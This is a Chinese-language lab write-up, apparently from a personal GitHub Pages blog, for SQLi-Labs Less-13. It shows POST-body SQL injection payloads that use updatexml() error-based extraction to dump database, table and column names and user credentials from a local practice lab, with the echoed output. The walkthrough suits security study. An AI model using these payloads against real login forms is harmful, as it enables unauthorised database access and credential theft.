@@ -1,0 +1,88 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>【SQLi-Labs】Less-13 POST型双注入（报错注入）Writeup</title>
+    <style>
+        body { font-family: sans-serif; line-height: 1.8; max-width: 800px; margin: 0 auto; padding: 20px; color: #333; background-color: #fcfcfc; }
+        h1 { border-bottom: 2px solid #0366d6; padding-bottom: .3em; color: #0366d6; }
+        h2 { border-bottom: 1px solid #eaecef; padding-bottom: .3em; margin-top: 30px; color: #24292e; }
+        code { background-color: #f6f8fa; padding: 0.2em 0.4em; border-radius: 6px; font-family: monospace; color: #d73a49; }
+        pre { background-color: #f6f8fa; padding: 16px; border-radius: 6px; overflow: auto; font-family: monospace; }
+        .meta { color: #586069; font-size: 0.95em; margin-bottom: 20px; border-bottom: 1px dashed #eaecef; padding-bottom: 10px; }
+        .footer { margin-top: 50px; font-size: 0.9em; color: #586069; border-top: 1px solid #eaecef; padding-top: 10px; text-align: center; }
+        ul, ol { padding-left: 20px; }
+    </style>
+</head>
+<body>
+    <p><a href="index.html">← 返回首页</a></p>
+    <h1>【SQLi-Labs】Less-13 POST型双注入（报错注入）Writeup</h1>
+    
+    <div class="meta">
+        <p><strong>操作者：</strong>何芊宏 | <strong>操作日期：</strong>2026.10.24 | <strong>分类：</strong>CTF | <strong>标签：</strong>SQLi-Labs, Web, SQL注入, POST注入, 报错注入, Burp Suite</p>
+    </div>
+    
+    <h2>1. 题目信息</h2>
+    <ul>
+        <li><strong>平台：</strong>SQLi-Labs (本地 phpStudy 环境)</li>
+        <li><strong>分类：</strong>Web - SQL注入</li>
+        <li><strong>题目名称：</strong>Less-13 (POST - Double Injection - Single quotes - String - with twist)</li>
+        <li><strong>提示：</strong>POST请求，双注入（此处指报错注入），单引号+括号闭合</li>
+    </ul>
+
+    <h2>2. 解题思路与前置原理</h2>
+    <p>本关卡为 POST 登录框。通过观察前端源码可知，若登录成功，页面仅返回一张静态图片（flag.jpg），并不回显数据库数据。因此，常规的联合查询（UNION）无法直接获取数据。</p>
+    <p>根据题目提示 "Single quotes with twist" 与 "Double Injection"，需使用 Burp Suite 抓包，测试出闭合方式（单引号加括号 <code>')</code>），并采用 <strong>报错注入（Error-based Injection）</strong>。通过引入 MySQL 的 <code>updatexml()</code> 函数，故意构造非法 XPath 路径，将目标数据夹带在报错信息中输出。</p>
+
+    <h2>3. 工具配置与操作步骤</h2>
+    
+    <p><strong>工具环境：</strong>Burp Suite（需配置浏览器代理 127.0.0.1:8080，使用 Repeater 模块修改请求体）。</p>
+
+    <p><strong>第一步：抓包与探测闭合方式</strong></p>
+    <p>在登录框随意输入，抓取 POST 请求并发送至 Repeater。在请求体（Body）中测试闭合符：</p>
+    <ul>
+        <li>输入 <code>uname=admin'&passwd=123&submit=Submit</code>，页面回显 <code>LOGIN ATTEMPT FAILED</code>（无报错）。</li>
+        <li>输入 <code>uname=admin')&passwd=123&submit=Submit</code>，页面报出 SQL 语法错误：<code>near '123456') LIMIT 0,1'</code>。</li>
+    </ul>
+    <p><strong>解释与原理：</strong>报错信息证明单引号和括号成功闭合了 <code>username</code> 字段。推断后台 SQL 为 <code>SELECT * FROM users WHERE username=('$uname') AND password=('$passwd') LIMIT 0,1</code>。</p>
+
+    <p><strong>第二步：利用 updatexml 获取库名</strong></p>
+    <p>构造报错注入 Payload，使用 <code>#</code> 注释掉后续的密码验证逻辑：</p>
+    <pre><code>uname=1') AND updatexml(1, concat(0x7e, (select database()), 0x7e), 1) #&passwd=123456&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>页面报错 <code>XPATH syntax error: '~security~'</code>。</p>
+    <p><strong>解释与原理：</strong><code>0x7e</code> 是十六进制的波浪号 <code>~</code>。由于 <code>updatexml</code> 要求第二个参数必须是合法的 XPath 路径，传入包含 <code>~</code> 的字符串会强制触发报错，从而将库名 `security` 打印出来。</p>
+
+    <p><strong>第三步：获取表名与列名</strong></p>
+    <p>爆表名：</p>
+    <pre><code>uname=1') AND updatexml(1, concat(0x7e, (select group_concat(table_name) from information_schema.tables where table_schema='security'), 0x7e), 1) #&passwd=123456&submit=Submit</code></pre>
+    <p>回显：<code>~emails,referrers,uagents,users~</code>。</p>
+    
+    <p>爆列名：</p>
+    <pre><code>uname=1') AND updatexml(1, concat(0x7e, (select group_concat(column_name) from information_schema.columns where table_schema='security' and table_name='users'), 0x7e), 1) #&passwd=123456&submit=Submit</code></pre>
+    <p>回显：<code>~id,username,password~</code>。</p>
+
+    <p><strong>第四步：提取最终数据（触发截断）</strong></p>
+    <p>构造查询账号密码的 Payload，使用 <code>0x3a</code>（冒号）进行拼接：</p>
+    <pre><code>uname=1') AND updatexml(1, concat(0x7e, (select group_concat(username, 0x3a, password) from security.users), 0x7e), 1) #&passwd=123456&submit=Submit</code></pre>
+    <p><strong>回显现象：</strong>页面报错 <code>XPATH syntax error: '~Dumb:Dumb,Angelina:I-kill-you,D'</code>。</p>
+    <p><strong>解释与原理：</strong><code>updatexml</code> 报错信息最大仅支持 32 个字符。虽然数据被截断，但已成功证明并提取了部分明文数据。</p>
+
+    <h2>4. 踩坑记录与复盘</h2>
+    <ul>
+        <li><strong>POST 型注入特性：</strong>参数隐藏在请求体中，无法通过 URL 直接修改。需掌握 Burp Suite 抓包、发送到 Repeater 并修改 Body 的操作。</li>
+        <li><strong>报错注入的截断限制：</strong>受限于 <code>updatexml</code> 底层机制，只能显示 32 字符。实战中若需全量数据，需配合 <code>substr()</code> 函数进行分段截取，或编写 Python 脚本进行自动化遍历。</li>
+        <li><strong>十六进制标识符的妙用：</strong>使用 <code>0x7e</code> (波浪号) 和 <code>0x3a</code> (冒号) 能够有效避免引号在复杂 POST 请求体中被转义或过滤，同时作为数据边界标志，方便肉眼识别。</li>
+    </ul>
+
+    <h2>5. 知识点总结</h2>
+    <ul>
+        <li><strong>双引号/单引号带括号闭合：</strong>应对特定的 SQL 语句嵌套结构，需在闭合时同时补齐对应的括号。</li>
+        <li><strong>报错注入（Error-based）：</strong>在无回显但有报错的场景下，利用函数机制缺陷强行让数据在错误信息中输出。</li>
+    </ul>
+
+    <div class="footer">
+        <p>Hosted on GitHub Pages</p>
+    </div>
+</body>
+</html>
